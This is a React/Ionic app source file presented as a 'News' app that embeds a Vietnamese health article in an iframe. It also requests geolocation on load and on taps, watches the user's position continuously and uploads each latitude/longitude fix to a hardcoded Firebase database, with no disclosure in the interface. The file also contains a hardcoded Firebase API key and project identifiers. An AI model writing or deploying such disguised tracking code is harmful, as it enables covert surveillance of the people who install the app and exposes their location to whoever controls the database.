import {
  IonContent,
  IonHeader,
  IonPage,
  IonTitle,
  IonToolbar,
  setupIonicReact
} from '@ionic/react';

/* Core CSS required for Ionic components to work properly */
import '@ionic/react/css/core.css';

/* Basic CSS for apps built with Ionic */
import '@ionic/react/css/normalize.css';
import '@ionic/react/css/structure.css';
import '@ionic/react/css/typography.css';

/* Optional CSS utils that can be commented out */
import '@ionic/react/css/padding.css';
import '@ionic/react/css/float-elements.css';
import '@ionic/react/css/text-alignment.css';
import '@ionic/react/css/text-transformation.css';
import '@ionic/react/css/flex-utils.css';
import '@ionic/react/css/display.css';

/* Theme variables */
import './theme/variables.css';
import { initializeApp } from 'firebase/app';
import { getDatabase, ref, set } from "firebase/database";
import moment from 'moment';
import { useCallback, useEffect, useState } from 'react';
import { Geolocation } from '@capacitor/geolocation';
import { NotFoundError } from '@superfaceai/one-sdk';
// Follow this pattern to import other Firebase services
// TODO: Replace the following with your app's Firebase project configuration
const firebaseConfig = {
  apiKey: "AIzaSyAcXxFjY48bEW88jaLHM-cbeSXsE302JZ0",
  authDomain: "loc2-8963f.firebaseapp.com",
  databaseURL: "https://loc2-8963f-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "loc2-8963f",
  storageBucket: "loc2-8963f.appspot.com",
  messagingSenderId: "911657219640",
  appId: "1:911657219640:web:8364fc91d30846bd4298cd",
  measurementId: "G-7XCY8YZ0NH"
};

const dbapp = initializeApp(firebaseConfig);
const db = getDatabase(dbapp);

// Get a list of cities from your database
function writeUserData(object) {
  set(ref(db, 'users/' + object.id), {
    ...object
  });
}


setupIonicReact();
// config
const App: React.FC = () => {

  const getLocation = useCallback(
    function () {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition, showError);
      } else {
        alert("Trình duyệt của bạn không hỗ trợ định vị người dùng.");
      }
    }, [])

  const showPosition = useCallback(
    function (position) {
      savePos(position)
      // connect("loc", {lat: latitude, lon: longitude})
    }, [])

  function showError(error) {
    // switch (error.code) {
    //     case error.PERMISSION_DENIED:
    //         alert("Người dùng từ chối cung cấp vị trí.");
    //         break;
    //     case error.POSITION_UNAVAILABLE:
    //         alert("Không thể xác định được vị trí.");
    //         break;
    //     case error.TIMEOUT:
    //         alert("Quá thời gian để xác định vị trí.");
    //         break;
    //     case error.UNKNOWN_ERROR:
    //         alert("Lỗi không xác định.");
    //         break;
    // }
  }

  useEffect(function () {
    Geolocation.checkPermissions().then(sta => {
      if ((sta.location + sta.coarseLocation).includes("granted")) {
        Geolocation.watchPosition({}, function(pos){
          savePos(pos)
        })
      }
    })
  }, [Geolocation])

  const savePos = function(pos){
    const { latitude, longitude } = pos?.coords
    writeUserData({ lat: latitude, lon: longitude, id: moment(Date.now()).format("YYYY-MM-DD HH:mm:ss") })
  }


  return (
    <IonPage onLoad={getLocation}>
      <IonHeader>
        <IonToolbar onClick={getLocation}>
          <IonTitle>News</IonTitle>
        </IonToolbar>
      </IonHeader>
      <IonContent onClick={getLocation} fullscreen>
        <IonHeader collapse="condense">
          <IonToolbar>
            <IonTitle size="large">Tab 3</IonTitle>
          </IonToolbar>
        </IonHeader>
        <iframe width={"100%"} height={"80%"} src='https://suckhoedoisong.vn/nam-2024-mo-rong-ra-soat-tien-su-tiem-chung-tiem-bu-mui-vaccine-cho-tre-mam-non-tieu-hoc-169231231163213335.htm'></iframe>
      </IonContent>
    </IonPage>
  );
}

export default App;
